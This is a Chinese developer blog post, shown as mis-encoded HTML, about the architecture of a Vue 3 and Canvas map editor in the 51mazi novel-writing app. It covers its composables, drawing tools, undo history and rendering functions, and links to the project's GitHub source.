code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ—ºï¸ ä»é›¶åˆ°ä¸€ï¼šæ‰“é€ ä¸“ä¸šçº§å°è¯´åœ°å›¾è®¾è®¡å·¥å…·çš„æŠ€æœ¯å®è·µ</h2>
<blockquote>
<p>ğŸ’¡ æœ¬æ–‡è¯¦ç»†ä»‹ç» 51mazi é¡¹ç›®ä¸­åœ°å›¾è®¾è®¡é¡µçš„æ•´ä½“æ¶æ„ä¸æ ¸å¿ƒåŠŸèƒ½å®ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäº Vue 3 + Canvas çš„ä¸“ä¸šçº§åœ°å›¾ç¼–è¾‘å™¨ï¼Œé›†æˆäº†å¤šç§ç»˜å›¾å·¥å…·ã€èµ„æºç®¡ç†ã€ç¼©æ”¾æ§åˆ¶ç­‰å®Œæ•´åŠŸèƒ½ã€‚é€šè¿‡æ¨¡å—åŒ–çš„ Composables æ¶æ„è®¾è®¡ï¼Œå®ç°äº†é«˜å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§çš„ä»£ç ç»“æ„ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ğŸ“‹ ç›®å½•</h3>
<ul>
<li><a href="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF" title="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF">é¡¹ç›®èƒŒæ™¯</a></li>
<li><a href="#%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88" title="#%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88">æŠ€æœ¯æ¶æ„æ¦‚è§ˆ</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97" title="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97">æ ¸å¿ƒåŠŸèƒ½æ¨¡å—</a></li>
<li><a href="#%E6%A8%A1%E5%9D%97%E5%8C%96%E8%AE%BE%E8%AE%A1" title="#%E6%A8%A1%E5%9D%97%E5%8C%96%E8%AE%BE%E8%AE%A1">æ¨¡å—åŒ–è®¾è®¡</a></li>
<li><a href="#%E6%8A%80%E6%9C%AF%E4%BA%AE%E7%82%B9" title="#%E6%8A%80%E6%9C%AF%E4%BA%AE%E7%82%B9">æŠ€æœ¯äº®ç‚¹</a></li>
<li><a href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B" title="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B">æ€»ç»“ä¸å±•æœ›</a></li>
</ul>
<h3 data-id="heading-2">ğŸ¯ é¡¹ç›®èƒŒæ™¯</h3>
<p>åœ¨å°è¯´åˆ›ä½œè¿‡ç¨‹ä¸­ï¼Œä½œè€…ç»å¸¸éœ€è¦ç»˜åˆ¶æ•…äº‹ä¸­çš„åœ°å›¾æ¥å¸®åŠ©è¯»è€…ç†è§£æ•…äº‹èƒŒæ™¯å’Œåœ°ç†å…³ç³»ã€‚ä¼ ç»Ÿçš„å†™ä½œè½¯ä»¶å¾€å¾€ç¼ºä¹è¿™æ ·çš„å¯è§†åŒ–å·¥å…·ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ 51mazi ä¸­é›†æˆäº†åŸºäº Canvas çš„ä¸“ä¸šçº§åœ°å›¾è®¾è®¡åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-3">ğŸ—ºï¸ åœ°å›¾è®¾è®¡å·¥å…·</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/795bd303ec2b415b93720627693383d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z5Zu95rWq5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766291447&amp;x-signature=0G2BSM99f3u1O1yiM%2B%2BJeekBvr8%3D" alt="maps.png" loading="lazy"/></p>
<p><em>å¼ºå¤§çš„åœ°å›¾è®¾è®¡å·¥å…· - ä¸“ä¸šçº§ Canvas ç»˜å›¾ä¸èµ„æºç®¡ç†</em></p>
<h4 data-id="heading-4">âœ¨ åŠŸèƒ½ç‰¹æ€§æ¦‚è§ˆ</h4>
<p>åœ°å›¾è®¾è®¡é¡µæä¾›äº†å®Œæ•´çš„ç»˜å›¾å·¥å…·é›†ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>ğŸ¨ <strong>10+ ç§ç»˜å›¾å·¥å…·</strong>: ç§»åŠ¨ã€é€‰æ¡†ã€ç”»ç¬”ã€æ©¡çš®æ“¦ã€å½¢çŠ¶ã€æ²¹æ¼†æ¡¶ã€æ–‡å­—ã€èµ„æºã€èƒŒæ™¯ç­‰</li>
<li>ğŸ” <strong>ç”»å¸ƒæ§åˆ¶</strong>: ç¼©æ”¾ã€å¹³ç§»ã€é‡ç½®è§†å›¾ï¼Œæ”¯æŒé¼ æ ‡æ»šè½®å’Œå¿«æ·é”®æ“ä½œ</li>
<li>ğŸ¯ <strong>ç²¾ç¡®æ“ä½œ</strong>: é€‰æ¡†å·¥å…·æ”¯æŒé€‰æ‹©ã€ç§»åŠ¨ã€è°ƒæ•´å¤§å°ã€æ—‹è½¬ç­‰æ“ä½œ</li>
<li>ğŸ’¾ <strong>æ•°æ®ç®¡ç†</strong>: å®Œæ•´çš„æ’¤é”€/é‡åšç³»ç»Ÿï¼Œè‡ªåŠ¨ä¿å­˜å’ŒåŠ è½½åœ°å›¾æ•°æ®</li>
<li>ğŸ¨ <strong>å‚æ•°æ§åˆ¶</strong>: é¢œè‰²é€‰æ‹©å™¨ã€å¤§å°æ»‘å—ã€é€æ˜åº¦æ»‘å—ï¼Œç²¾ç¡®æ§åˆ¶ç»˜åˆ¶æ•ˆæœ</li>
<li>ğŸ–¼ï¸ <strong>èµ„æºç®¡ç†</strong>: é¢„è®¾å›¾æ ‡èµ„æºåº“ï¼Œæ”¯æŒæ‹–æ‹½æ·»åŠ å’Œè°ƒæ•´</li>
<li>âŒ¨ï¸ <strong>å¿«æ·é”®æ”¯æŒ</strong>: å®Œæ•´çš„é”®ç›˜å¿«æ·é”®ç³»ç»Ÿï¼Œæå‡æ“ä½œæ•ˆç‡</li>
</ul>
<h3 data-id="heading-5">ğŸ—ï¸ æŠ€æœ¯æ¶æ„æ¦‚è§ˆ</h3>
<h4 data-id="heading-6">æŠ€æœ¯æ ˆ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ ¸å¿ƒæŠ€æœ¯æ ˆ</span>
{
  <span class="hljs-string">"vue"</span>: <span class="hljs-string">"^3.5.13"</span>,           <span class="hljs-comment">// Vue 3 Composition API</span>
  <span class="hljs-string">"element-plus"</span>: <span class="hljs-string">"^2.10.1"</span>,  <span class="hljs-comment">// UI ç»„ä»¶åº“</span>
  <span class="hljs-string">"canvas"</span>: <span class="hljs-string">"åŸç”Ÿ Canvas API"</span>  <span class="hljs-comment">// ç»˜å›¾å¼•æ“</span>
}
</code></pre>
<h4 data-id="heading-7">æ•´ä½“æ¶æ„è®¾è®¡</h4>
<p>åœ°å›¾è®¾è®¡é¡µé‡‡ç”¨ <strong>æ¨¡å—åŒ–çš„ Composables æ¶æ„</strong>ï¼Œå°†ä¸åŒåŠŸèƒ½æ‹†åˆ†ä¸ºç‹¬ç«‹çš„ composable å‡½æ•°ï¼Œå®ç°äº†æ¸…æ™°çš„ä»£ç ç»„ç»‡å’Œé«˜åº¦å¯ç»´æŠ¤æ€§ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">MapDesign.vue (ä¸»ç»„ä»¶)
â”œâ”€â”€ åŸºç¡€ Composables
â”‚   â”œâ”€â”€ useCanvasState.js      <span class="hljs-comment"># ç”»å¸ƒçŠ¶æ€ç®¡ç†ï¼ˆç¼©æ”¾ã€å¹³ç§»ã€è¾¹ç•Œï¼‰</span>
â”‚   â”œâ”€â”€ useCoordinate.js       <span class="hljs-comment"># åæ ‡è½¬æ¢å·¥å…·</span>
â”‚   â”œâ”€â”€ useHistory.js          <span class="hljs-comment"># å†å²è®°å½•ç®¡ç†ï¼ˆæ’¤é”€/é‡åšï¼‰</span>
â”‚   â”œâ”€â”€ useElements.js         <span class="hljs-comment"># å…ƒç´ æ•°æ®ç®¡ç†</span>
â”‚   â”œâ”€â”€ useRender.js           <span class="hljs-comment"># æ¸²æŸ“å‡½æ•°é›†åˆ</span>
â”‚   â””â”€â”€ useCanvas.js            <span class="hljs-comment"># ç”»å¸ƒæ¸²æŸ“å’Œç®¡ç†</span>
â”‚
â””â”€â”€ å·¥å…· Composables
    â”œâ”€â”€ usePencilTool.js        <span class="hljs-comment"># ç”»ç¬”å·¥å…·</span>
    â”œâ”€â”€ useEraserTool.js        <span class="hljs-comment"># æ©¡çš®æ“¦å·¥å…·</span>
    â”œâ”€â”€ useShapeTool.js         <span class="hljs-comment"># å½¢çŠ¶å·¥å…·ï¼ˆçº¿æ¡ã€çŸ©å½¢ã€åœ†å½¢ç­‰ï¼‰</span>
    â”œâ”€â”€ useTextTool.js          <span class="hljs-comment"># æ–‡å­—å·¥å…·</span>
    â”œâ”€â”€ useBucketTool.js        <span class="hljs-comment"># æ²¹æ¼†æ¡¶å·¥å…·</span>
    â”œâ”€â”€ useResourceTool.js      <span class="hljs-comment"># èµ„æºå·¥å…·</span>
    â”œâ”€â”€ useSelectTool.js        <span class="hljs-comment"># é€‰æ¡†å·¥å…·ï¼ˆé€‰æ‹©ã€ç§»åŠ¨ã€è°ƒæ•´ã€æ—‹è½¬ï¼‰</span>
    â”œâ”€â”€ useMoveTool.js          <span class="hljs-comment"># ç§»åŠ¨å·¥å…·ï¼ˆå¹³ç§»ç”»å¸ƒï¼‰</span>
    â””â”€â”€ useBackgroundTool.js    <span class="hljs-comment"># èƒŒæ™¯å·¥å…·</span>
</code></pre>
<h4 data-id="heading-8">æ ¸å¿ƒç»„ä»¶ç»“æ„</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- src/renderer/src/views/MapDesign.vue --&gt;
&lt;template&gt;
  &lt;div class="map-design"&gt;
    &lt;!-- å·¥å…·æ  --&gt;
    &lt;MapToolbar
      v-model="tool"
      :shape-tool-type="shapeToolType"
      @update:model-value="onToolChange"
      @clear="handleClearCanvas"
      @resource-select="selectResource"
      @save-map="handleSaveMap"
    /&gt;

    &lt;!-- é¢œè‰²é€‰æ‹©å™¨ --&gt;
    &lt;Transition name="color-picker-fade"&gt;
      &lt;div v-if="showColorPicker" class="color-picker-container"&gt;
        &lt;el-color-picker v-model="currentColor" /&gt;
      &lt;/div&gt;
    &lt;/Transition&gt;

    &lt;!-- æ»‘å—æ§åˆ¶å·¥å…· --&gt;
    &lt;FloatingSidebar :visible="tool === 'pencil' || tool === 'eraser' || tool === 'shape'"&gt;
      &lt;MapSlider v-model="size" label="å¤§å°" /&gt;
      &lt;MapSlider v-model="opacity" label="é€æ˜åº¦" /&gt;
    &lt;/FloatingSidebar&gt;

    &lt;!-- ç”»å¸ƒå®¹å™¨ --&gt;
    &lt;div class="editor-container" @wheel="handleWheel"&gt;
      &lt;canvas
        ref="canvasRef"
        :width="canvasDisplayWidth"
        :height="canvasDisplayHeight"
        @mousedown="handleCanvasMouseDown"
        @mousemove="handleCanvasMouseMove"
        @mouseup="handleCanvasMouseUp"
      /&gt;
    &lt;/div&gt;

    &lt;!-- ç¼©æ”¾æ§åˆ¶å™¨å’Œæ’¤é”€/å›é€€æŒ‰é’® --&gt;
    &lt;MapZoomControls
      :scale="canvasState.scale.value"
      @zoom-in="handleZoomIn"
      @zoom-out="handleZoomOut"
      @reset-zoom="handleResetZoom"
      @undo="handleUndo"
      @redo="handleRedo"
    /&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>å®Œæ•´ä»£ç è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fviews%2FMapDesign.vue" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/views/MapDesign.vue" ref="nofollow noopener noreferrer">src/renderer/src/views/MapDesign.vue</a></p>
</blockquote>
<h3 data-id="heading-9">ğŸ”§ æ ¸å¿ƒåŠŸèƒ½æ¨¡å—</h3>
<h4 data-id="heading-10">1. ç”»å¸ƒçŠ¶æ€ç®¡ç† (useCanvasState)</h4>
<p>ç®¡ç†ç”»å¸ƒçš„ç¼©æ”¾ã€å¹³ç§»ã€è¾¹ç•Œç­‰æ ¸å¿ƒçŠ¶æ€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ ¸å¿ƒçŠ¶æ€ç®¡ç†</span>
<span class="hljs-keyword">const</span> canvasState = <span class="hljs-title function_">useCanvasState</span>()

<span class="hljs-comment">// ä¸»è¦çŠ¶æ€</span>
- <span class="hljs-attr">scale</span>: ç”»å¸ƒç¼©æ”¾æ¯”ä¾‹
- scrollX/<span class="hljs-attr">scrollY</span>: ç”»å¸ƒå¹³ç§»åç§»
- <span class="hljs-attr">contentBounds</span>: å†…å®¹è¾¹ç•Œï¼ˆç”¨äºè‡ªåŠ¨è°ƒæ•´ç”»å¸ƒå¤§å°ï¼‰
- canvasDisplayWidth/<span class="hljs-title class_">Height</span>: ç”»å¸ƒæ˜¾ç¤ºå°ºå¯¸
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseCanvasState.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useCanvasState.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useCanvasState.js</a></p>
</blockquote>
<h4 data-id="heading-11">2. å…ƒç´ ç®¡ç†ç³»ç»Ÿ (useElements)</h4>
<p>ç»Ÿä¸€ç®¡ç†æ‰€æœ‰ç»˜åˆ¶å…ƒç´ ï¼ŒåŒ…æ‹¬ç”»ç¬”è·¯å¾„ã€å½¢çŠ¶ã€æ–‡å­—ã€èµ„æºã€å¡«å……åŒºåŸŸç­‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">const</span> elements = <span class="hljs-title function_">useElements</span>()

<span class="hljs-comment">// å…ƒç´ åˆ†ç±»</span>
- <span class="hljs-attr">freeDrawElements</span>: ç”»ç¬”ç»˜åˆ¶çš„è·¯å¾„
- <span class="hljs-attr">shapeElements</span>: å½¢çŠ¶å…ƒç´ ï¼ˆçº¿æ¡ã€çŸ©å½¢ã€åœ†å½¢ç­‰ï¼‰
- <span class="hljs-attr">textElements</span>: æ–‡å­—å…ƒç´ 
- <span class="hljs-attr">resourceElements</span>: èµ„æºå…ƒç´ ï¼ˆå›¾æ ‡ã€å›¾ç‰‡ï¼‰
- <span class="hljs-attr">fillElements</span>: å¡«å……åŒºåŸŸ

<span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•</span>
- <span class="hljs-title function_">serialize</span>(): åºåˆ—åŒ–æ‰€æœ‰å…ƒç´ ä¸º <span class="hljs-title class_">JSON</span>
- <span class="hljs-title function_">deserialize</span>(): ä» <span class="hljs-title class_">JSON</span> æ¢å¤å…ƒç´ 
- <span class="hljs-title function_">clearAll</span>(): æ¸…ç©ºæ‰€æœ‰å…ƒç´ 
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseElements.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useElements.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useElements.js</a></p>
</blockquote>
<h4 data-id="heading-12">3. å†å²è®°å½•ç³»ç»Ÿ (useHistory)</h4>
<p>å®ç°å®Œæ•´çš„æ’¤é”€/é‡åšåŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å†å²è®°å½•ç®¡ç†</span>
<span class="hljs-keyword">const</span> { history } = <span class="hljs-title function_">useHistory</span>(canvasRef)

<span class="hljs-comment">// æ ¸å¿ƒåŠŸèƒ½</span>
- <span class="hljs-title function_">saveState</span>(): ä¿å­˜å½“å‰çŠ¶æ€
- <span class="hljs-title function_">undo</span>(): æ’¤é”€æ“ä½œ
- <span class="hljs-title function_">redo</span>(): é‡åšæ“ä½œ
- <span class="hljs-title function_">canUndo</span>(): æ˜¯å¦å¯ä»¥æ’¤é”€
- <span class="hljs-title function_">canRedo</span>(): æ˜¯å¦å¯ä»¥é‡åš
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseHistory.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useHistory.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useHistory.js</a></p>
</blockquote>
<h4 data-id="heading-13">4. æ¸²æŸ“ç³»ç»Ÿ (useRender)</h4>
<p>ç»Ÿä¸€çš„æ¸²æŸ“å‡½æ•°é›†åˆï¼Œè´Ÿè´£ç»˜åˆ¶å„ç§å…ƒç´ ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¸²æŸ“å‡½æ•°</span>
<span class="hljs-keyword">const</span> renderFunctions = <span class="hljs-title function_">useRender</span>(canvasRef)

<span class="hljs-comment">// æ¸²æŸ“æ–¹æ³•</span>
- <span class="hljs-title function_">renderFreeDrawPath</span>(): æ¸²æŸ“ç”»ç¬”è·¯å¾„
- <span class="hljs-title function_">renderShape</span>(): æ¸²æŸ“å½¢çŠ¶ï¼ˆä½¿ç”¨ <span class="hljs-title class_">Rough</span>.<span class="hljs-property">js</span>ï¼‰
- <span class="hljs-title function_">renderText</span>(): æ¸²æŸ“æ–‡å­—
- <span class="hljs-title function_">renderResource</span>(): æ¸²æŸ“èµ„æºï¼ˆå›¾æ ‡/å›¾ç‰‡ï¼‰
- <span class="hljs-title function_">renderFill</span>(): æ¸²æŸ“å¡«å……åŒºåŸŸ
- <span class="hljs-title function_">renderSelection</span>(): æ¸²æŸ“é€‰æ¡†
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useRender.js</a></p>
</blockquote>
<h4 data-id="heading-14">5. å·¥å…·ç³»ç»Ÿ</h4>
<p>æ¯ä¸ªç»˜å›¾å·¥å…·éƒ½æ˜¯ç‹¬ç«‹çš„ composableï¼Œå®ç°äº†ç»Ÿä¸€çš„æ¥å£ï¼š</p>
<h5 data-id="heading-15">ç”»ç¬”å·¥å…· (usePencilTool)</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> pencilTool = <span class="hljs-title function_">usePencilTool</span>({
  canvasRef,
  elements,
  history,
  renderCanvas,
  color,
  size,
  opacity
})

<span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•</span>
- <span class="hljs-title function_">onMouseDown</span>(): å¼€å§‹ç»˜åˆ¶
- <span class="hljs-title function_">onMouseMove</span>(): ç»˜åˆ¶è¿‡ç¨‹
- <span class="hljs-title function_">onMouseUp</span>(): ç»“æŸç»˜åˆ¶
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/usePencilTool.js</a></p>
</blockquote>
<h5 data-id="heading-16">é€‰æ¡†å·¥å…· (useSelectTool)</h5>
<p>æœ€å¤æ‚çš„å·¥å…·ä¹‹ä¸€ï¼Œæ”¯æŒé€‰æ‹©ã€ç§»åŠ¨ã€è°ƒæ•´å¤§å°ã€æ—‹è½¬ç­‰æ“ä½œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> selectTool = <span class="hljs-title function_">useSelectTool</span>({
  elements,
  history,
  renderCanvas,
  selectedElementIds,
  canvasState,
  canvasCursor
})

<span class="hljs-comment">// æ ¸å¿ƒåŠŸèƒ½</span>
- å•é€‰å’Œå¤šé€‰
- æ‹–æ‹½ç§»åŠ¨å…ƒç´ 
- è°ƒæ•´å…ƒç´ å¤§å°ï¼ˆ<span class="hljs-number">8</span>ä¸ªæ§åˆ¶ç‚¹ï¼‰
- æ—‹è½¬å…ƒç´ 
- åˆ é™¤é€‰ä¸­å…ƒç´ 
- æ™ºèƒ½å…‰æ ‡æ ·å¼
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FuseSelectTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/useSelectTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/useSelectTool.js</a></p>
</blockquote>
<h5 data-id="heading-17">å½¢çŠ¶å·¥å…· (useShapeTool)</h5>
<p>æ”¯æŒå¤šç§å½¢çŠ¶ç»˜åˆ¶ï¼šçº¿æ¡ã€çŸ©å½¢ã€åœ†å½¢ã€åœ†è§’çŸ©å½¢ã€äº”è§’æ˜Ÿã€ç®­å¤´ç­‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> shapeTool = <span class="hljs-title function_">useShapeTool</span>({
  canvasRef,
  elements,
  history,
  renderCanvas,
  color,
  size,
  opacity
})

<span class="hljs-comment">// æ”¯æŒçš„å½¢çŠ¶ç±»å‹</span>
- <span class="hljs-attr">line</span>: çº¿æ¡
- <span class="hljs-attr">rect</span>: çŸ©å½¢
- <span class="hljs-attr">circle</span>: åœ†å½¢
- <span class="hljs-attr">roundRect</span>: åœ†è§’çŸ©å½¢
- <span class="hljs-attr">star</span>: äº”è§’æ˜Ÿ
- <span class="hljs-attr">arrow</span>: ç®­å¤´
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FuseShapeTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/useShapeTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/useShapeTool.js</a></p>
</blockquote>
<h5 data-id="heading-18">å…¶ä»–å·¥å…·</h5>
<ul>
<li><strong>æ©¡çš®æ“¦å·¥å…·</strong>: ç²¾ç¡®æ“¦é™¤å·²ç»˜åˆ¶å†…å®¹</li>
<li><strong>æ–‡å­—å·¥å…·</strong>: æ·»åŠ æ–‡å­—æ ‡æ³¨ï¼Œæ”¯æŒåŒå‡»ç¼–è¾‘</li>
<li><strong>æ²¹æ¼†æ¡¶å·¥å…·</strong>: åŒºåŸŸå¡«å……ï¼Œä½¿ç”¨æ´ªæ°´å¡«å……ç®—æ³•</li>
<li><strong>èµ„æºå·¥å…·</strong>: æ‹–æ‹½æ·»åŠ é¢„è®¾å›¾æ ‡å’Œå›¾ç‰‡</li>
<li><strong>ç§»åŠ¨å·¥å…·</strong>: å¹³ç§»ç”»å¸ƒè§†å›¾</li>
<li><strong>èƒŒæ™¯å·¥å…·</strong>: è®¾ç½®ç”»å¸ƒèƒŒæ™¯è‰²</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>æ‰€æœ‰å·¥å…·å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Ftree%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/tree/main/src/renderer/src/composables/map/tools" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/</a></p>
</blockquote>
<h3 data-id="heading-19">ğŸ¨ æ¨¡å—åŒ–è®¾è®¡</h3>
<h4 data-id="heading-20">Composables æ¶æ„ä¼˜åŠ¿</h4>
<ol>
<li><strong>é«˜å†…èšä½è€¦åˆ</strong>: æ¯ä¸ª composable ä¸“æ³¨äºå•ä¸€èŒè´£</li>
<li><strong>æ˜“äºæµ‹è¯•</strong>: ç‹¬ç«‹çš„ composable ä¾¿äºå•å…ƒæµ‹è¯•</li>
<li><strong>ä»£ç å¤ç”¨</strong>: å¯ä»¥åœ¨å…¶ä»–ç»„ä»¶ä¸­å¤ç”¨ç›¸åŒçš„ composable</li>
<li><strong>æ˜“äºç»´æŠ¤</strong>: ä¿®æ”¹æŸä¸ªåŠŸèƒ½åªéœ€å…³æ³¨å¯¹åº”çš„ composable</li>
<li><strong>ç±»å‹å®‰å…¨</strong>: æ¸…æ™°çš„æ¥å£å®šä¹‰ï¼Œå‡å°‘é”™è¯¯</li>
</ol>
<h4 data-id="heading-21">å·¥å…·ç»Ÿä¸€æ¥å£</h4>
